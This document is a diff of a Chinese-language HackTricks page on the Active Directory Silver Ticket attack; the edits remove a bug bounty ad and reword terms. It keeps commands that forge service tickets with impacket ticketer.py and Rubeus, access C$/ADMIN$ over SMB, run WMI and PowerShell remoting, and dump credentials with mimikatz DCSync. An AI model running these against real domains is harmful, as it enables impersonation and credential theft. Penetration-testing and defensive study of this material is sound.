@@ -2,19 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **注册** **Intigriti**，一个由黑客为黑客创建的高级**漏洞赏金平台**！今天就加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！
-
-{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silver ticket
 
-**Silver Ticket** 攻击涉及在 Active Directory (AD) 环境中利用服务票证。此方法依赖于 **获取服务账户的 NTLM 哈希**，例如计算机账户，以伪造票据授予服务 (TGS) 票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用 AES 密钥伪造票证更安全且不易被检测。
+**银票**攻击涉及在Active Directory (AD)环境中利用服务票证。此方法依赖于**获取服务账户的NTLM哈希**，例如计算机账户，以伪造票证授予服务(TGS)票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用AES密钥伪造票证更安全且不易被检测。
 
 对于票证制作，根据操作系统使用不同的工具：
 
-### On Linux
+### 在Linux上
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -36,18 +32,18 @@ CIFS服务被强调为访问受害者文件系统的常见目标，但其他服�
 
 ## 可用服务
 
-| 服务类型                                   | 服务银票                                                         |
-| ------------------------------------------ | --------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                        |
+| 服务类型                                   | 服务银票                                                       |
+| ------------------------------------------ | ------------------------------------------------------------ |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                      |
 | PowerShell远程                             | <p>HOST</p><p>HTTP</p><p>根据操作系统还包括：</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p> |
-| 计划任务                                  | HOST                                                           |
-| Windows文件共享，也包括psexec            | CIFS                                                           |
-| LDAP操作，包括DCSync                      | LDAP                                                           |
-| Windows远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                             |
-| 黄金票证                                  | krbtgt                                                         |
+| 计划任务                                  | HOST                                                         |
+| Windows文件共享，也包括psexec            | CIFS                                                         |
+| LDAP操作，包括DCSync                      | LDAP                                                         |
+| Windows远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                           |
+| 黄金票据                                  | krbtgt                                                       |
 
-使用**Rubeus**，您可以使用参数**请求所有**这些票证：
+使用**Rubeus**，您可以使用参数**请求所有**这些票据：
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
@@ -57,13 +53,13 @@ CIFS服务被强调为访问受害者文件系统的常见目标，但其他服�
 - 4634：账户注销
 - 4672：管理员登录
 
-## 滥用服务票证
+## 滥用服务票据
 
-在以下示例中，假设票证是通过模拟管理员账户获取的。
+在以下示例中，假设票据是通过模拟管理员账户获取的。
 
 ### CIFS
 
-使用此票证，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被暴露）并将文件复制到远程文件系统的某个部分，只需执行类似以下操作：
+使用此票据，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被暴露）并将文件复制到远程文件系统的某个部分，只需执行类似以下操作：
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
@@ -113,14 +109,14 @@ wmic remote.computer.local list full /format:list
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-查看以下页面以了解 **使用 winrm 连接远程主机的更多方法**：
+检查以下页面以了解 **使用 winrm 连接远程主机的更多方法**：
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> 请注意，**winrm 必须在远程计算机上处于活动和监听状态**才能访问它。
+> 请注意，**winrm 必须在远程计算机上处于活动和监听状态**才能访问。
 
 ### LDAP
 
@@ -139,10 +135,6 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 dcsync.md
 {{#endref}}
 
-<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**漏洞赏金提示**：**注册** **Intigriti**，一个由黑客为黑客创建的高级**漏洞赏金平台**！今天就加入我们 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！
-
-{% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
